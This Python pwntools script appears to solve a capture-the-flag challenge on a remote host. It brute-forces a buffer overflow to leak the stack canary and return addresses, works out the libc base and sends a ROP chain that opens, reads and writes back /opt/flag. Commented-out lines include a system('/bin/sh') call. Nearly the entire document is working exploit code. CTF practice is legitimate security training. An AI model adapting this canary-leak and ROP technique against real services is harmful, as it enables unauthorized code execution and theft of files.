#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')

host = args.HOST or 'io5.ept.gg'
port = int(args.PORT or 32684)

def start(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def dumpstack(Start, Iterations):
    idx = 0x49 + Start
    data = b'\0'
    for _ in range(Iterations):
        if len(data) >= 27*8:   # added after trial and error
            break
        try:
            sleep(0.5)
            io = start()
            io.sendafter(b'> ', b'A'*idx)
            io.recv(idx)
            leak = io.recvuntil(b'*** stack', drop=True)
            if len(leak) == 0:
                idx += 1
                data += b'\0'
            else:
                idx += len(leak)
                data += leak
            print(data.hex())
            io.close()
        except:
            io.close()
            pass
    return idx, data

stackdump = b'00995915bda039f6d0aa8b9bfd7f00005cf648093856000030ab8b9bfd7f0000000000000400000050ab8b9bfd7f00003af548093856000068ac8b9bfd7f000000000000020000000000000000000000000000001000000000040000030000000400000000000000020004000000000000000000000000000200b3140a000296000000000000000031302e302e322e313530000000000000000000000000000000995915bda039f6020000000000000090ad0cfb417f00000000000000000000a9f3480938560000000000000200000068ac8b9bfd7f0000'

if len(stackdump) == 0:
    idx, stackdump = dumpstack(0, 150)

stack = [
    hex(int.from_bytes(bytes.fromhex(stackdump[i:i+16].decode('ascii')).rjust(8,b'\0'), 'little'))
    for i in range(0,len(stackdump),16)]

pprint(stack)

canary = int(stack[0],0)
rbp = int(stack[1],0)
exe_rip = int(stack[2],0)
exe_base = exe_rip-0x165c
libc_start_call_main = int(stack[22],0)
buffer = rbp-0x70
log.info(f"canary {hex(canary)}")
log.info(f"rbp {hex(rbp)}")
log.info(f"exe_base {hex(exe_base)}")
log.info(f"libs_start_call_main {hex(libc_start_call_main)}")

libc = ELF('./libc-2.35.so')
# I didn't find this symbol in my libc, so had to check the offset manually.
# libc.address = libc_start_call_main - libc.symbols[__libc_start_call_main]-128
libc.address = libc_start_call_main - 0x29D10 - 128
log.info(f"libc base @ {hex(libc.address)}")

rop = ROP(libc)

#rop.call(rop.ret)
#rop.puts(rbp)
#rop.system(next(libc.search(b'/bin/sh\0')))
#rop.write(4, rbp-0x70, 200)
#rop.write(4,exe_base, 0x100)

rop.open(buffer,0)
#rop.raw(libc.address + 0x0cea5a)  # 0x00000000000cea5a : xchg eax, edx ; ret
#rop.rdi = 4
#rop.rsi = exe_base+0x2080
#rop.call(rop.ret)
#rop.call(libc.sym.dprintf)

rop.read(3, buffer, 34)
rop.write(4, buffer, 34)

io = start()
io.sendafter(b'> ', flat({ 0: b'/opt/flag\0', 0x48: p64(canary), 0x50: p64(rbp), 0x58: rop.chain()}))
#io.recvuntil(b'qaaaraaa')
io.interactive();